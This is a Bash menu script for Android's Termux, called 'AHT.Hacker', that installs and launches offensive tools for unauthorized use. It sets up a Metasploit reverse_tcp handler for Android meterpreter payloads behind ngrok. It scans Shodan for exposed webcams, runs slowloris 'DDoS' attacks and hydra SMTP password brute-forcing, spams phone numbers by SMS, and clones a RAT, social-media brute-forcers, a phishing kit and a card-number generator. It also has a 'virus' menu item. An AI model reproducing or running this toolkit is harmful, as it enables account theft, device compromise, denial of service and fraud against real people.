#!/bin/bash
# the writer By : Ahmed Altorky
# install metasploit
# install payload
# open ngrok
# Hacking photo
# AHT t0olss
# send SMS
# Emaill
# Virous Android
# Virous wendows
# Virous Whatsapp
# DDOOS attacc
# hack account 
# Arch linux
#######################################################
# following channel youtube : AHT Hacker              #
# following accont facebook : Ahmed.Altorky.Android   #
# watssapp : 01095616440                              #
#######################################################

# colors
x='\033[1;30m'
a='\033[1;31m'
b='\033[1;32m'
c='\033[1;33m'
d='\033[1;34m'
e='\033[1;35m'
f='\033[1;36m'
g='\033[1;37m'
h='\033[1;38m'
i='\033[1;39m'
#colors2
A='\e[41m'
B='\e[42m'
C='\e[43m'
D='\e[44m'
E='\e[45m'
F='\e[46m'
G='\e[47m'
H='\e[48m'
I='\e[49m'
#exiting 
exiting(){
	echo -e "Do you want to$a EXIT$b [y/n]"
	echo -e "$d"
        read -p "[ AHT @ HAKER ]~# " xx
        if [ $xx == y ] || [ $xx == Y ];then
		clear
		sleep 1
		figlet -f big "	    Good By"
		echo ''
		echo -e "$a py : Ahmed Altorky"
		sleep 0.2
		echo -e "$e+++++++++++$a +++++++++++++++++++++ $d ++++++++++++++++++++++"
		sleep 0.2
		echo -e "$a AHT.Hacker V 4.0 "
		echo -e "$b +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
		sleep 0.2
		echo -e "$b Youtube : Ahmed Altorky Android "
		echo -e "$c +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
		sleep 0.2
		echo -e "$c watssapp : 01095616449 "
		echo -e "$d +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
		sleep 0.2
		echo -e "$d Facebook : https://www.facebook.com/Ahmed.Altorky.Android "
		sleep 0.2
		echo -e "$a+++++++++++$e +++++++++++++++++++++ $c +++++++++++++++++++++++"
                exit
        elif [ $xx == n ] || [ $xx == N ];then
                cd $HOME/AHT.Hacker
		bash AHT.sh
        fi
}

msf(){
echo -e -n "$f ip----->~#  ";read ip
echo -e -n "$e  port---->~#  ";read port
cd $HOME/AHT.Hacker/home
bash .waite.sh
cd $HOME
echo "use exploit/multi/handler" > .msf1.rc
echo "set payload android/meterpreter/reverse_tcp " >> .msf1.rc
echo "set lhost $ip" >> .msf1.rc                                      
echo "set lport $port" >> .msf1.rc
echo "exploit" >> .msf1.rc                                            

msfconsole -r .msf1.rc


}


#sems
cd $HOME/AHT.Hacker/home
bash .sem.sh
echo -e "$c"
read -p "[ AHT @ HAKER ]~# " numper

#install metasploit
if [ $numper -eq 1 ]
then
	
        pkg install unstable-repo

        pkg install metasploit

	cd $HOME

        msf
	echo ''
	exiting

#install apk metasploit
elif [ $numper -eq 3 ]
then
	toilet " 	APK-Install "
	echo 
	cd $HOME/AHT.Hacker/home
	bash .apkmeta.sh
	echo ''
	exiting

#go to meta
elif [ $numper -eq 2 ];then
	cd $HOME
	msf
	echo ''
	exiting
# Haking photo
elif [ $numper -eq 4 ];then
photo(){	
	echo -e "$b"
	figlet -f big "       Hakeing photo"	
	echo ""
	echo -e "$d To access the site$a type$c [1] " "$d <=======$a To start the hack $d type$c [2] "
	echo ''
	sleep 0.2
	echo -e "$a new hack photo$b type$c [3] " "$d <======$c open camera$a [4] "
	echo ''
	sleep 0.2 
	echo -e "       $a [00]$b Exit" "       $b [99]$a Back To Home"
	echo ''
	sleep 0.2
	read -p "[ AHT @ HAKER ]~# " nn
	if [ $nn -eq 1 ];then
	termux-open https://www.shodan.io
		echo ''
		photo
	elif [ $nn -eq 2 ];then
	
		cd $HOME
		apt update && apt upgrade -y
		apt install python
		easy_install shodan
		pip install shodan requests
		echo -e "$a .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-."
		echo -e "$b .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-."
		read -p "tyb the code~# " code
		sleep 2
		shodan init $code
		echo -e "$c  please$a waite$d searshing....."
		cd $HOME/AHT.Hacker/home
		bash .waite.sh
		echo -e "$e"
		shodan search webcamxp > a.txt
		mv a.txt $HOME/AHT.Hacker/home
		cd $HOME/AHT.Haker/home
		cat a.txt
		echo -e "$e copy ip and port ... paste on web"
		echo -e "$b"
		read -p "enter IP:port~# " ip
		read -p " tyb [55] hack camera~# " web
		if [ $web -eq 55 ];then
			termux-open http://$ip
		fi
			echo ''
			photo
	elif [ $nn -eq 3 ];then
		apt update && apt upgrade 
		pkg install git 
		pkg install python2 
		pip2 install requests
		cd $HOME/AHT.Hacker/home
                bash .waite.sh
		git clone https://github.com/kancotdiq/ipcs.git
		echo ''
		photo
	elif [ $nn -eq 4 ];then
		cd $HOME/ipcs
		python2 scan.py
		echo ''
		echo ''
		echo -e -n "$a type$b Ip:port? : ";read cam
		echo ''
		echo -e "$a +++++++++++++++$b +++++++++++++++++++++++++++"
		echo -e "$c To open the camera use the Buffon browser "
		echo -e "$a +++++++++++++++$b ++++++++++++++++++++++++++++"
		echo ''
		echo -e -n "$c Enter ";read Enter
		termux-open $cam
		echo ''
		photo
	elif [ $nn -eq 00 ];then
		exiting
	elif [ $nn -eq 99 ];then
		cd $HOME/AHT.Hacker
		bash AHT.sh
	else 
		echo ''
		photo
	fi
}
photo
# open the port on ngrok
elif [ $numper -eq 5 ];then
ngrok(){
	echo -e "$a"
	figlet -f big "			Ngrok"
	echo ""
	echo -e "$a [$b 1$a ]$c download ngrok" "$a [$b 2$a ]$c open ngrok"
	echo ''
	sleep 0.2
	echo -e "      $a [00]$b Exit" "      $b [99]$a Back To Home"
	echo ''
	sleep 0.2 
	read -p "==>>~# " ngrok
	if [ $ngrok -eq 1 ];then
		termux-open https://ngrok.com
		ngrok
	elif [ $ngrok -eq 2 ];then
		echo -e "$c"
		read -p "type the port ?: " port
		echo -e -n "$a chose$d [$b http,tcp$d ]" ;read h
		cd /sdcard/download

		mv ngrok-stable-linux-arm.zip $HOME

		cd $HOME

		unzip ngrok-stable-linux-arm.zip

		rm ngrok-stable-linux-arm.zip

		chmod +x ngrok

		./ngrok $h $port
		echo ''
		ngrok
	elif [ $ngrok -eq 00 ];then
                exiting
        elif [ $ngrok -eq 99 ];then
                cd $HOME/AHT.Hacker
                bash AHT.sh
	else
		ngrok
	fi
}
	ngrok
# Install To0lss Hack
elif [ $numper -eq 6 ];then
TOoLs(){
	 echo -e "$d"
	figlet -f big "                 AHT   T0olss"
	echo -e "$a+++++++++++++++++$c ++++++++++++++++++++++++++++++$d ++++++++++++++++++++++++"
	echo -e "$b"
	cd $HOME/AHT.Hacker/home
	bash .sem-t0olss.sh
	echo -e ""
	echo -e -n "$d [ AHT.Hacker ]~# " ;read tool
	if [ $tool -eq 00 ] || [ $tool -eq 0 ]; then
		echo ''
		exiting
	elif [ $tool -eq 99 ]; then
		cd $HOME/AHT.Hacker
		bash AHT.sh
	elif [ $tool -eq 1 ]; then
                cd $HOME/AHT.Hacker/home
                bash .waite.sh
		clear
		echo -e "$a"
                figlet "WPSeku"
                cd ~
                git clone https://github.com/m4ll0k/WPSeku.git
                TOoLs
        elif [ $tool -eq 2 ]; then
                cd $HOME/AHT.Hacker/home
                bash .waite.sh
		clear  
                echo -e "$a"                       
	        figlet "InjeCtor-SY"  
                cd ~
                git clone https://github.com/omarsalloum/InjeCtor-SY.git
                TOoLs
        elif [ $tool -eq 3  ]; then
                cd $HOME/AHT.Hacker/home
                bash .waite.sh
		clear
                echo -e "$a"
                figlet "0xSQLiNJ"
                cd ~
                git clone https://github.com/0xAbdullah/0xSQLiNJ
                TOoLs
        elif [ $tool -eq 4 ]; then
                cd $HOME/AHT.Hacker/home
                bash waite.sh
		clear
                echo -e "$a"
                figlet "sqlmap"
                cd ~
                git clone https://github.com/sqlmapproject/sqlmap
                TOoLs
        elif [ $tool -eq 5 ]; then
                cd $HOME/AHT.Hacker/home
                bash waite.sh
		clear
                echo -e "$a"
                figlet "Xshell"
                cd ~
                git clone clone https://github.com/Ubaii/Xshell
                TOoLs
        elif [ $tool -eq 6 ]; then
                cd $HOME/AHT.Hacker/home
                bash waite.sh
		clear
		echo -e "$a"
                figlet "XAttacker"
                cd ~
                git clone https://github.com/Moham3dRiahi/XAttacker
                TOoLs
        elif [ $tool -eq 7 ]; then
                cd $HOME/AHT.Hacker/home
                bash waite.sh
		clear
                echo -e "$a"
                figlet "OWScan"
                cd ~
                git clone https://github.com/Gameye98/OWScan
                TOoLs
        elif [ $tool -eq 8 ]; then
                cd $HOME/AHT.Hacker/home
                bash waite.sh
		clear
                echo -e "$a"
                figlet "Breacher"
                cd ~
                git clone https://github.com/UltimateHackers/Breacher
                TOoLs
        elif [ $tool -eq 9 ]; then
                cd $HOME/AHT.Hacker/home
                bash waite.sh
		clear
                echo -e "$a"
                figlet "Nmap"
                cd ~
                apt update && apt upgrade
                pkg install nmap -y
                TOoLs
        elif [ $tool -eq 10 ]; then
                cd $HOME/AHT.Hacker/home
                bash waite.sh
		clear
                echo -e "$a"
                figlet "Txtool"
                cd ~
                git clone https://github.com/kuburan/txtool
                TOoLs
	elif [ $tool -eq 11 ]; then
                clear
                echo -e "$a"
                figlet "A-RAT"
                cd ~
                git clone https://github.com/Xi4u7/A-Rat
                TOoLs
        elif [ $tool -eq 12 ]; then
                clear
                echo -e "$a"
                figlet "Facebook Brute"
                cd ~
                git clone https://github.com/HackerAdana/facebook-brute-force.git
                TOoLs
        elif [ $tool -eq 13 ]; then
		clear
                echo -e "$a"
                figlet "InstaHack"
                cd ~
                apt update && apt upgrade
                apt install python2 git
                pip2 install requests
                git clone https://github.com/avramit/instahack
                TOoLs
        elif [ $tool -eq 14 ]; then
                clear
                echo -e "$a"
                figlet "gmail_attacker"
                cd ~
                git clone https://github.com/AyoubSirai/gmail_attacker.git
                TOoLs
        elif [ $tool -eq 15 ]; then
                clear
                echo -e "$a"
                figlet "Hash Buster"
                cd ~
                git clone https://github.com/UltimateHackers/Hash-Buster.git
                TOoLs
        elif [ $tool -eq 16  ]; then
                clear
                echo -e "$a"
                figlet "weeman"
                cd ~
                git clone https://github.com/evait-security/weeman.git
                TOoLs
        elif [ $tool -eq 17 ]; then
                clear
                echo -e "$a"
                figlet "wifite"
                cd ~
                wget https://raw.github.com/derv82/wifite/master/wifite.py
                TOoLs
        elif [ $tool -eq 18 ]; then
                clear
                echo -e "$a"
                figlet "Sudo"
                cd ~
                git clone https://github.com/st42/termux-sudo
                TOoLs
	elif [ $tool -eq 19 ]; then
                clear
                echo -e "$a"
                figlet "Ubuntu"
                cd ~
                git clone https://github.com/Neo-Oli/termux-ubuntu
                TOoLs
        elif [ $tool -eq 20 ]; then
                clear
                echo -e "$a"
                figlet "Fedora"
                cd ~
                wget https://raw.githubusercontent.com/nmilosev/termux-fedora/master/termux-fedora.sh
                TOoLs
	elif [ $tool -eq 21 ]; then
                clear
                echo -e "$a"
                figlet "Ninja-WordList"
                cd ~
                git clone https://github.com/mahowscomputer/Ninja-WordList.git
                TOoLs
	else
		TOoLs
	fi
}
	TOoLs
elif [ $numper -eq 7 ];then
sms(){
	figlet -f big "			send SMS"
	echo -e "  $c [1]$d imstall SMS" "$d       [2]$c send SMS"
	echo ''
	sleep 0.2
	echo -e "  $a [00]$e Exit" "$b [99]$a Back To Home"
	echo ''
	sleep 0.2
	echo -e -n "$d [ AHT.Hacker ]~# " ;read sms
	if [ $sms -eq 1 ];then
		cd $HOME/AHT.Hacker/home
                bash .waite.sh
		cd ~
		apt update && apt upgrade -y
		git clone https://github.com/Noxturnix/Spammer-Grab
		pip2 install requests
		figlet "Done"
		sms
	elif [ $sms -eq 2 ];then
		echo -e -n "$b type$a Numper Exapel 201095616440: ";read nm
		cd $HOME/Spammer-Grab
		python2 spammer.py --delay 30 $nm
		sms
	elif [ $sms -eq 00 ];then
                exiting
        elif [ $sms -eq 99 ];then
                cd $HOME/AHT.Hacker
                bash AHT.sh
	else
		sms
	fi
}
sms
elif [ $numper -eq 8 ];then
email(){
	figlet -f big "		      Email"
	echo ''
	echo -e "$d 	[1]$b install Email" "$c	 [2]$a open Email"
	echo ''
	sleep 0.2
	echo -e "  $a [00]$e Exit" "$b		 [99]$a Back To Home"
	echo ''
	sleep 2
	echo -e -n "$d [ AHT.Hacker ]~# " ;read ee
	echo ''
	if [ $ee -eq 1 ];then
		cd $HOME/AHT.Hacker/home
                bash .waite.sh
		cd ~
		apt update && apt upgrade -y
		git clone https://github.com/laramies/theHarvester.git
		cd theHarvester
		pip install -r requirements.txt
		figlet "Done"
		email
	elif [ $ee -eq 2 ];then
		cd $HOME/AHT.Hacker/home
                bash .waite.sh
		echo -e "$a Example :$e hotmail.com" 
		echo -e -n "$c domain :$a ";read domain
		echo -e "$a Example :$e 100 " 
		echo -e -n "$b Number of results :$d ";read numper
		echo -e "$a Example :$e google " 
		echo -e -n "$d the Site :$b ";read site
		echo -e "$a Example :$e name.txt"
		echo -e -n "$c Name file :$b";read name
		cd $HOME/theHarvester
		python3 theHarvester.py -d $domain -l $numper -b $site > $name
		cd $HOME/theHarvester
		mv $name $HOME
		cd $HOME
		echo -e "$e File uploaded in$a HOME/$name"
		sleep 1
		email
	elif [ $ee -eq 00 ];then
                exiting
        elif [ $ee -eq 99 ];then
                cd $HOME/AHT.Hacker
                bash AHT.sh
	fi
}
email

# VIRUS AHT.Hacker
elif [ $numper -eq 9 ];then

	cd $HOME/AHT.Hacker/home
	cd .viapk
	bash .viapk.sh
# Distributions Linux For Android
# py AHT.Hacker
# Ahmed Altorky
elif [ $numper -eq 10 ];then
	
	cd $HOME/AHT.Hacker/home
	bash .AHT-linux.sh

# DDoos Attak for The Site
# py AHT.Hacker
elif [ $numper -eq 11 ];then
	figlet "      DDoos"
	echo ''
	sleep 1
	echo -e -n "$g Enter$c The Site ~#  ";read site
	cd $HOME/AHT.Hacker/home
        bash .waite.sh
	slowloris $site
	exiting
# fiza cards 
# py AHT.Hacker
# py Ahmed Altorky
elif [ $numper -eq 12 ];then
cards(){
	figlet "  Cards"
	echo ''
	sleep 0.4
	echo -e "$c [1]$h install Card" "$c [2]$h open cards"
	echo ''
	sleep 0.6
	echo -e "  $a [00]$e Exit" "$b           [99]$a Back To Home"
	echo ''
	sleep 0.2
	echo -e -n "$a enter$b the numper ~#  ";read card
	if [ $card -eq 1 ];then
		cd $HOME/AHT.Hacker/home
	        bash .waite.sh
		echo ''
		cd ~
		apt update && apt upgrade -y 
		git clone https://github.com/INDOnimous/Card-Number.git

		cards
	elif [ $card -eq 2 ];then
		cd $HOME
		cd Card-Number
		php CMQyGnfN
		read -p "coutnue" enter
		cards
	elif [ $card -eq 00 ];then
		echo ''
                exiting
        elif [ $card -eq 99 ];then
                cd $HOME/AHT.Hacker
                bash AHT.sh
        fi
}
cards

# hack account
# use hydra 
# py Ahmed Altorky
elif [ $numper -eq 13 ];then
account(){
	figlet " Hack Account"
	echo ''
	sleep 0.3
	echo -e "$a Example$f google.com "
	echo -e -n "$c Type Domain ~#$e  ";read domain
	echo ''
	echo -e "$a Example$f ahmed@gmail.com "
	echo -e -n "$c Type email ~#$e  ";read email
	echo ''
	echo -e "$a Example$f ahmed.txt "
	echo -e -n "$c Type Password ~#$e  ";read password
	echo ''
	echo -e "$a-----------------------------------"
	echo -e "$a Example Stmp                     |"
	echo -e "$b google =$c [ 465 ]               |"
	echo -e "$d hotmail =$c [ 587 ]              |"
	echo -e "$i yahoo =$c [ 587 ]                |"
	echo -e "\033[1;30m -----------------------------------"
	echo -e -n "$c Type stmp ~#$e  ";read stmp
	echo ''
	echo ''
	cd $HOME
	hydra -S -l $email -P $password -v -V -e ns -s $stmp smtp.$domain smtp
	echo ''
	exiting
}
account

elif [ $numper -eq 14 ];then
louk(){
	figlet "louk Account"
	echo ''
        sleep 0.4
        echo -e "$c [1]$h install Louk Account" "$c [2]$h open Louk"
        echo ''
        sleep 0.6
        echo -e "  $a [00]$e Exit" "$b           [99]$a Back To Home"
        echo ''
        sleep 0.2
        echo -e -n "$a enter$b the numper ~#  ";read luk
	if [ $luk -eq 1 ];then
		cd $HOME/AHT.Hacker/home
                bash .waite.sh
		echo ''
		cd $HOME
		apt update && apt upgrade -y
		git clone https://github.com/IlayTamvan/Report.git
		cd $HOME
		cd Report
		unzip Report.zip
		python2 Report.py
		
		louk
	elif [ $luk -eq 2 ];then
		cd $HOME/Report
		python2 Report.py
		
		louk
	elif [ $luk -eq 00 ];then
                echo ''
                exiting
        elif [ $luk -eq 99 ];then
                cd $HOME/AHT.Hacker
                bash AHT.sh
        fi
}
louk
#exit
elif [ $numper -eq 00 ]
then
	echo ''
	exiting
# Facebook
elif [ $numper -eq 11 ]
then
	termux-open https://www.facebook.com/Ahmed.Altorky.Android
	echo ''
	exiting

# Youtube
elif [ $numper -eq 22 ]
then 
	termux-open https://www.youtube.com/channel/UCTUFvrUd3hIUNWzbVWJjBGQ
	echo ''
	exiting
elif [ $numper -eq 33 ];then
	figlet -f big "		UPDATE"
	sleep 1
	cd $HOME/AHT.Hacker
	chmod 755 *
	cd $HOME
	rm -rif AHT.Hacker
	echo " 		waite"
	sleep 1
	apt update && apt upgrade
	git clone https://github.com/Ahmed-Altorky-Android/AHT.Hacker.git
	cd $HOME/AHT.Hacker
	bash install.sh
	bash AHT.sh
	figlet "	Done"
else
	cd $HOME/AHT.Hacker
	bash AHT.sh
fi



